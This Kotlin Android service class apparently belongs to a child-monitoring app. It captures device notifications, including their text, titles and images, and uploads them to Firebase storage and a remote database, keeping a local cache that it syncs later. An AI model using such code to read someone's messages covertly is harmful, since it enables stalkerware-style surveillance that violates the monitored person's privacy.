package com.dtz.netservice.services.notificationService

import android.content.Context
import android.graphics.Bitmap
import android.net.Uri
import com.dtz.netservice.data.model.NotificationMessages
import com.dtz.netservice.rxFirebase.InterfaceFirebase
import com.dtz.netservice.utils.ConstFun.getDateTime
import com.dtz.netservice.utils.Consts
import com.dtz.netservice.utils.Consts.CHILD_PERMISSION
import com.dtz.netservice.utils.Consts.DATA
import com.dtz.netservice.utils.Consts.NOTIFICATION_MESSAGE
import com.dtz.netservice.utils.DataBaseHelper
import com.dtz.netservice.utils.FileHelper.getFileNameBitmap
import com.pawegio.kandroid.e
import io.reactivex.android.schedulers.AndroidSchedulers
import io.reactivex.disposables.CompositeDisposable
import io.reactivex.schedulers.Schedulers
import java.io.File
import java.util.*
import javax.inject.Inject

/**
 * Created by luis rafael on 27/03/19.
 */
class InteractorNotificationService @Inject constructor(private val context: Context, private val firebase: InterfaceFirebase) : InterfaceNotificationListener {

    private var disposable: CompositeDisposable = CompositeDisposable()
    private val db = DataBaseHelper(context)

    override fun setRunService(run: Boolean) {
        if (firebase.getUser()!=null) firebase.getDatabaseReference("$NOTIFICATION_MESSAGE/$CHILD_PERMISSION").setValue(run)
    }

    override fun getNotificationExists(id: String, exec: () -> Unit) {
        if (firebase.getUser()!=null) {
            disposable.add(firebase.queryValueEventSingle("$NOTIFICATION_MESSAGE/$DATA","nameImage",id)
                    .map { value -> value.exists() }
                    .subscribeOn(Schedulers.io())
                    .observeOn(AndroidSchedulers.mainThread())
                    .subscribe({ if (!it) exec() },{ e(Consts.TAG,it.message.toString()) }))
        }
    }

    override fun setDataMessageNotification(type: Int, text: String?, title: String?,nameImage: String?,image:Bitmap?) {
        if (image!=null){

            val imageFile = image.getFileNameBitmap(context,nameImage!!)
            val uri = Uri.fromFile(File(imageFile))
            disposable.add(firebase.putFile("$NOTIFICATION_MESSAGE/$nameImage",uri)
                    .subscribeOn(Schedulers.io())
                    .observeOn(AndroidSchedulers.mainThread())
                    .subscribe({ task ->
                        task.storage.downloadUrl.addOnCompleteListener {
                            setData(type,text,title,nameImage,it.result.toString())
                            saveNotificationToDB(type,text,title,nameImage,it.result.toString())
                            //FileHelper.deleteFile(imageFile)
                        }
                    }, { error ->
                        e(Consts.TAG, error.message.toString())
                        //FileHelper.deleteFile(imageFile)
                    }))

        }else setData(type,text,title,"-","-")

        saveNotificationToDB(type,text,title,"-","-")
        getSavedNotifications()
    }

    override fun setSavedMessageNotification(
        type: Int,
        text: String?,
        title: String?,
        nameImage: String?,
        image: String?
    ) {
        saveNotificationToDB(type, text, title, nameImage, image)
    }

    private fun setData(type: Int, text: String?, title: String?,nameImage:String?,urlImage:String?){
        val uuid = UUID.randomUUID().toString()
        val message = NotificationMessages(uuid, text,title,type,getDateTime(),nameImage,urlImage)
        firebase.getDatabaseReference("$NOTIFICATION_MESSAGE/$DATA").push().setValue(message)
    }

    private fun getSavedNotifications() {
        val data = db.readNotificationData();
        try {
            data.forEach { notification ->
                firebase.getDatabaseReference("${Consts.SAVED_NOTIFICATIONS}/")
                    .push()
                    .setValue(notification)
                    .addOnCompleteListener {
                        notification.uuid?.let { it1 -> db.deleteOneNotificationData(it1) }
                    }
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }
        //firebase.getDatabaseReference("${Consts.SAVED_NOTIFICATIONS}/").setValue(data)
    }

    private fun saveNotificationToDB(type: Int, text: String?, title: String?,nameImage:String?,urlImage:String?) {
        val currentTimeMillis = System.currentTimeMillis()
        val uuid = UUID.randomUUID().toString()
        val notificationMessages = NotificationMessages(uuid, text, title, type, currentTimeMillis.toString(), nameImage, urlImage)
        db.insertNotification(notificationMessages)
    }

}